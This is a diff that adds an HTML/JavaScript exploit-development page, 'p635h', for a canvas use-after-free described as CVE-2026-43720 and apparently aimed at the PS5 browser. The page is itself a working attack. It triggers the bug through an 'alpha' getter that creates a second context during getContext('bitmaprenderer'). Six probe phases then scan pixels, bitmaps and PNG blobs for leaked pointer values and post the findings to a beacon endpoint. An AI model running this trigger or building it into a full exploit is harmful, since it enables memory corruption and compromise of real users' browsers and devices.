@@ -1,0 +1,430 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635h</title></head>
+<body><pre id="out">p635h: Canvas UAF — bitmaprenderer context + transferFromImageBitmap</pre>
+<script>
+'use strict';
+/*
+  p635h: CVE-2026-43720 — probe the BITMAPRENDERER context itself
+  -- prior art: p635g all 6 same-type-reclaim leak paths CLEAN
+  -- prior art: p692b confirmed bitmaprenderer=YES on PS5
+
+  The UAF trigger returns BOTH a bitmaprenderer AND a 2d context on the
+  same canvas. We've been probing the 2d alias. This probe explores the
+  bitmaprenderer context object — its transferFromImageBitmap method may
+  interact with confused internal canvas state.
+
+  CRASH_CLASS: MODERATE
+
+  Strategy:
+  A) Enumerate bitmaprenderer context properties and methods
+  B) transferFromImageBitmap: create ImageBitmap, transfer to confused canvas,
+     then read pixels through 2d inner — may expose ImageBitmap internal pointer
+  C) Multiple transfers: transfer different bitmaps, check if 2d reads stale data
+  D) createImageBitmap from confused canvas — may expose internal backing buffer
+  E) canvas.toBlob() on confused canvas — async path may race
+  F) Re-getContext: call getContext('2d') again — what does it return?
+     Call getContext('bitmaprenderer') again — same object or new?
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635H-' + tag + (d !== undefined ? '-' + String(d).slice(0, 800) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635h', msg:msg, level:'info', sid:'p635h-'+Date.now(), ua:navigator.userAgent}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1] >>> 0).toString(16)).padStart(8, '0') + ((u[0] >>> 0).toString(16)).padStart(8, '0');
+  } catch(e) { return 'ERR'; }
+}
+
+function isPointerLike(v) {
+  if (typeof v !== 'number' || v !== v) return false;
+  var buf = new ArrayBuffer(8);
+  new Float64Array(buf)[0] = v;
+  var hi = new Uint32Array(buf)[1];
+  return (hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF)
+      || (hi >= 0x00007F00 && hi <= 0x00007FFF);
+}
+
+bk('START', navigator.userAgent);
+
+// Modified trigger that also returns the bitmaprenderer context
+function triggerUAF_full() {
+  var inner = null;
+  var bmr = null;
+  var cv = document.createElement('canvas');
+  cv.width = 64; cv.height = 64;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  try { bmr = cv.getContext('bitmaprenderer', opts); } catch(e) {}
+  return {inner: inner, bmr: bmr, canvas: cv};
+}
+
+// ================================================================
+// PHASE A: Enumerate bitmaprenderer context
+// ================================================================
+bk('A-START', 'enumerate bmr');
+var uafA = triggerUAF_full();
+bk('A-OBJS', 'inner=' + (uafA.inner ? typeof uafA.inner : 'null') +
+   ' bmr=' + (uafA.bmr ? typeof uafA.bmr : 'null'));
+
+if (uafA.bmr) {
+  var props = [];
+  for (var k in uafA.bmr) {
+    var v;
+    try { v = typeof uafA.bmr[k]; } catch(e) { v = 'ERR'; }
+    props.push(k + ':' + v);
+  }
+  bk('A-PROPS', props.join(', '));
+
+  // Check prototype
+  try {
+    var proto = Object.getPrototypeOf(uafA.bmr);
+    var pnames = Object.getOwnPropertyNames(proto);
+    bk('A-PROTO', pnames.join(', '));
+  } catch(e) { bk('A-PROTO', 'ERR:' + e.message.slice(0,40)); }
+
+  // Check canvas reference
+  try {
+    bk('A-CANVAS', 'bmr.canvas===cv:' + (uafA.bmr.canvas === uafA.canvas) +
+       ' inner.canvas===cv:' + (uafA.inner ? uafA.inner.canvas === uafA.canvas : 'N/A'));
+  } catch(e) { bk('A-CANVAS', 'ERR:' + e.message.slice(0,40)); }
+} else {
+  bk('A-FAIL', 'no bmr context');
+}
+bk('A-DONE', 'survived');
+
+// ================================================================
+// PHASE B: transferFromImageBitmap on confused canvas
+// ================================================================
+bk('B-START', 'transferFromImageBitmap');
+var uafB = triggerUAF_full();
+if (!uafB.bmr || !uafB.inner) {
+  bk('B-FAIL', 'bmr=' + !!uafB.bmr + ' inner=' + !!uafB.inner);
+} else {
+  // Create a source canvas with known pattern
+  var src = document.createElement('canvas');
+  src.width = 64; src.height = 64;
+  var sctx = src.getContext('2d');
+  sctx.fillStyle = '#ff0000';
+  sctx.fillRect(0, 0, 32, 64);
+  sctx.fillStyle = '#0000ff';
+  sctx.fillRect(32, 0, 32, 64);
+
+  // createImageBitmap then transfer
+  try {
+    if (typeof createImageBitmap === 'function') {
+      bk('B-CIB', 'createImageBitmap exists');
+      createImageBitmap(src).then(function(bmp) {
+        bk('B-BMP', 'bitmap created ' + bmp.width + 'x' + bmp.height);
+
+        // Transfer to the confused canvas via bmr context
+        try {
+          uafB.bmr.transferFromImageBitmap(bmp);
+          bk('B-TRANSFER', 'transfer OK');
+        } catch(e) {
+          bk('B-TRANSFER', 'ERR:' + e.message.slice(0,60));
+        }
+
+        // Now read pixels through the 2d inner context
+        try {
+          var px = uafB.inner.getImageData(0, 0, 64, 64);
+          var r0 = px.data[0] + ',' + px.data[1] + ',' + px.data[2] + ',' + px.data[3];
+          var mid = 32*4;
+          var r32 = px.data[mid] + ',' + px.data[mid+1] + ',' + px.data[mid+2] + ',' + px.data[mid+3];
+          bk('B-PIX', 'px[0]=' + r0 + ' px[32]=' + r32);
+
+          // Check for non-pattern data (potential leak)
+          var anomaly = 0;
+          var anom_samples = [];
+          for (var i = 0; i < px.data.length; i += 4) {
+            var r = px.data[i], g = px.data[i+1], b = px.data[i+2], a = px.data[i+3];
+            // Expected: red (255,0,0,255) or blue (0,0,255,255) or black (0,0,0,0)
+            if (!((r===255 && g===0 && b===0 && a===255) ||
+                  (r===0 && g===0 && b===255 && a===255) ||
+                  (r===0 && g===0 && b===0 && a===0))) {
+              anomaly++;
+              if (anom_samples.length < 5) anom_samples.push('px[' + (i/4) + ']=' + r+','+g+','+b+','+a);
+            }
+          }
+          bk('B-ANOMALY', anomaly + ' non-pattern pixels' + (anom_samples.length > 0 ? ' ' + anom_samples.join(' ') : ''));
+
+          // Scan as float64 for pointers
+          var fv = new Float64Array(px.data.buffer);
+          var ptrs = [];
+          for (var j = 0; j < fv.length; j++) {
+            if (isPointerLike(fv[j])) {
+              ptrs.push('[' + j + ']=' + f64hex(fv[j]));
+              if (ptrs.length >= 5) break;
+            }
+          }
+          bk('B-PTR', ptrs.length > 0 ? ptrs.join(' ') : 'no pointers in pixels');
+        } catch(e) {
+          bk('B-READ', 'ERR:' + e.message.slice(0,60));
+        }
+
+        // Transfer null — should clear
+        try {
+          uafB.bmr.transferFromImageBitmap(null);
+          bk('B-NULL', 'null transfer OK');
+          var px2 = uafB.inner.getImageData(0, 0, 64, 64);
+          var nz = 0;
+          for (var i = 0; i < px2.data.length; i++) { if (px2.data[i] !== 0) nz++; }
+          bk('B-AFTER-NULL', 'nonzero bytes=' + nz);
+        } catch(e) {
+          bk('B-NULL', 'ERR:' + e.message.slice(0,60));
+        }
+
+        continuePhaseC();
+      }).catch(function(e) {
+        bk('B-CIB-ERR', e.message.slice(0,60));
+        continuePhaseC();
+      });
+    } else {
+      bk('B-CIB', 'createImageBitmap NOT available');
+      continuePhaseC();
+    }
+  } catch(e) {
+    bk('B-ERR', e.message.slice(0,60));
+    continuePhaseC();
+  }
+}
+
+if (!uafB.bmr || !uafB.inner) continuePhaseC();
+
+function continuePhaseC() {
+// ================================================================
+// PHASE C: createImageBitmap FROM confused canvas
+// ================================================================
+bk('C-START', 'createImageBitmap from UAF canvas');
+var uafC = triggerUAF_full();
+if (!uafC.inner) {
+  bk('C-FAIL', 'no inner');
+  continuePhaseD();
+  return;
+}
+
+// Draw something through inner
+uafC.inner.fillStyle = '#00ff00';
+uafC.inner.fillRect(0, 0, 64, 64);
+
+try {
+  if (typeof createImageBitmap === 'function') {
+    createImageBitmap(uafC.canvas).then(function(bmp) {
+      bk('C-BMP', bmp.width + 'x' + bmp.height);
+
+      // Draw the bitmap onto a clean canvas to read its pixels
+      var dest = document.createElement('canvas');
+      dest.width = 64; dest.height = 64;
+      var dctx = dest.getContext('2d');
+      dctx.drawImage(bmp, 0, 0);
+      var px = dctx.getImageData(0, 0, 64, 64);
+      var anomaly = 0;
+      var anom_samples = [];
+      for (var i = 0; i < px.data.length; i += 4) {
+        var r = px.data[i], g = px.data[i+1], b = px.data[i+2], a = px.data[i+3];
+        if (!(r===0 && g===255 && b===0 && a===255)) {
+          anomaly++;
+          if (anom_samples.length < 5) anom_samples.push('px[' + (i/4) + ']=' + r+','+g+','+b+','+a);
+        }
+      }
+      bk('C-PIXELS', anomaly + ' non-green' + (anom_samples.length > 0 ? ' ' + anom_samples.join(' ') : ''));
+
+      // Now: free inner's canvas, THEN createImageBitmap
+      uafC.canvas.width = 0; uafC.canvas.height = 0;
+      try {
+        createImageBitmap(uafC.canvas).then(function(bmp2) {
+          bk('C-FREED', 'bitmap from 0x0 canvas: ' + bmp2.width + 'x' + bmp2.height);
+          continuePhaseD();
+        }).catch(function(e) {
+          bk('C-FREED', 'ERR:' + e.message.slice(0,60));
+          continuePhaseD();
+        });
+      } catch(e) {
+        bk('C-FREED', 'sync ERR:' + e.message.slice(0,40));
+        continuePhaseD();
+      }
+    }).catch(function(e) {
+      bk('C-BMP-ERR', e.message.slice(0,60));
+      continuePhaseD();
+    });
+  } else {
+    bk('C-NO-CIB', 'createImageBitmap not available');
+    continuePhaseD();
+  }
+} catch(e) {
+  bk('C-ERR', e.message.slice(0,60));
+  continuePhaseD();
+}
+}
+
+function continuePhaseD() {
+// ================================================================
+// PHASE D: Re-getContext on confused canvas
+// ================================================================
+bk('D-START', 're-getContext');
+var uafD = triggerUAF_full();
+if (!uafD.canvas) {
+  bk('D-FAIL', 'no canvas');
+  continuePhaseE();
+  return;
+}
+
+// Try getContext('2d') again
+try {
+  var ctx2 = uafD.canvas.getContext('2d');
+  bk('D-2D', 'getContext(2d) returned ' + (ctx2 ? typeof ctx2 : 'null') +
+     ' same_as_inner=' + (ctx2 === uafD.inner));
+  if (ctx2 && uafD.inner) {
+    // Check if they share state
+    uafD.inner.lineWidth = 9999;
+    bk('D-SHARED', 'inner.lw=9999, ctx2.lw=' + ctx2.lineWidth);
+  }
+} catch(e) { bk('D-2D', 'ERR:' + e.message.slice(0,40)); }
+
+// Try getContext('bitmaprenderer') again
+try {
+  var bmr2 = uafD.canvas.getContext('bitmaprenderer');
+  bk('D-BMR', 'getContext(bmr) returned ' + (bmr2 ? typeof bmr2 : 'null') +
+     ' same_as_orig=' + (bmr2 === uafD.bmr));
+} catch(e) { bk('D-BMR', 'ERR:' + e.message.slice(0,40)); }
+
+// The key question: what does the canvas think its context type is?
+try {
+  var webgl = uafD.canvas.getContext('webgl');
+  bk('D-WEBGL', 'getContext(webgl) returned ' + (webgl ? typeof webgl : 'null'));
+} catch(e) { bk('D-WEBGL', 'ERR:' + e.message.slice(0,40)); }
+
+continuePhaseE();
+}
+
+function continuePhaseE() {
+// ================================================================
+// PHASE E: toBlob on confused canvas (async race)
+// ================================================================
+bk('E-START', 'toBlob');
+var uafE = triggerUAF_full();
+if (!uafE.inner || !uafE.canvas) {
+  bk('E-FAIL', 'missing');
+  continuePhaseF();
+  return;
+}
+
+uafE.inner.fillStyle = '#deadbe';
+uafE.inner.fillRect(0, 0, 64, 64);
+
+try {
+  if (typeof uafE.canvas.toBlob === 'function') {
+    uafE.canvas.toBlob(function(blob) {
+      if (!blob) { bk('E-BLOB', 'null blob'); continuePhaseF(); return; }
+      bk('E-BLOB', 'size=' + blob.size + ' type=' + blob.type);
+
+      // Read the blob
+      var fr = new FileReader();
+      fr.onload = function() {
+        var arr = new Uint8Array(fr.result);
+        bk('E-BLOBDATA', 'len=' + arr.length + ' hdr=' + arr[0] + ',' + arr[1] + ',' + arr[2] + ',' + arr[3]);
+        // PNG header: 137 80 78 71
+        if (arr[0] === 137 && arr[1] === 80) {
+          bk('E-PNG', 'valid PNG header');
+        }
+
+        // Scan raw blob for pointer-like patterns
+        var fv = new Float64Array(fr.result);
+        var ptrs = [];
+        for (var i = 0; i < fv.length && i < 10000; i++) {
+          if (isPointerLike(fv[i])) {
+            ptrs.push('[' + i + ']=' + f64hex(fv[i]));
+            if (ptrs.length >= 5) break;
+          }
+        }
+        bk('E-PTRSCAN', ptrs.length > 0 ? ptrs.join(' ') : 'no pointers in blob');
+        continuePhaseF();
+      };
+      fr.onerror = function() { bk('E-READER', 'ERR'); continuePhaseF(); };
+      fr.readAsArrayBuffer(blob);
+    }, 'image/png');
+  } else {
+    bk('E-NO-TOBLOB', 'toBlob not available');
+    continuePhaseF();
+  }
+} catch(e) {
+  bk('E-ERR', e.message.slice(0,60));
+  continuePhaseF();
+}
+}
+
+function continuePhaseF() {
+// ================================================================
+// PHASE F: drawImage cross-canvas from confused source
+// ================================================================
+bk('F-START', 'drawImage cross-canvas');
+var uafF = triggerUAF_full();
+if (!uafF.inner) {
+  bk('F-FAIL', 'no inner');
+  bk('DONE', 'all phases complete');
+  return;
+}
+
+// Fill with pattern via inner
+uafF.inner.fillStyle = '#aabbcc';
+uafF.inner.fillRect(0, 0, 64, 64);
+uafF.inner.fillStyle = '#112233';
+uafF.inner.font = '40px serif';
+uafF.inner.fillText('LEAK', 5, 45);
+
+// drawImage the confused canvas onto a clean canvas
+var dest = document.createElement('canvas');
+dest.width = 64; dest.height = 64;
+var dctx = dest.getContext('2d');
+
+try {
+  dctx.drawImage(uafF.canvas, 0, 0);
+  var px = dctx.getImageData(0, 0, 64, 64);
+  var unique = {};
+  for (var i = 0; i < px.data.length; i += 4) {
+    var key = px.data[i] + ',' + px.data[i+1] + ',' + px.data[i+2] + ',' + px.data[i+3];
+    unique[key] = (unique[key] || 0) + 1;
+  }
+  var keys = Object.keys(unique);
+  bk('F-UNIQUE', keys.length + ' unique colors');
+  // Show top 5
+  var sorted = keys.sort(function(a,b) { return unique[b] - unique[a]; });
+  for (var i = 0; i < Math.min(5, sorted.length); i++) {
+    bk('F-COLOR-' + i, sorted[i] + ' x' + unique[sorted[i]]);
+  }
+
+  // Scan for pointers
+  var fv = new Float64Array(px.data.buffer);
+  var ptrs = [];
+  for (var j = 0; j < fv.length; j++) {
+    if (isPointerLike(fv[j])) {
+      ptrs.push('[' + j + ']=' + f64hex(fv[j]));
+      if (ptrs.length >= 5) break;
+    }
+  }
+  bk('F-PTR', ptrs.length > 0 ? ptrs.join(' ') : 'no pointers');
+} catch(e) {
+  bk('F-ERR', e.message.slice(0,60));
+}
+
+bk('DONE', 'all phases complete');
+}
+</script>
+</body></html>
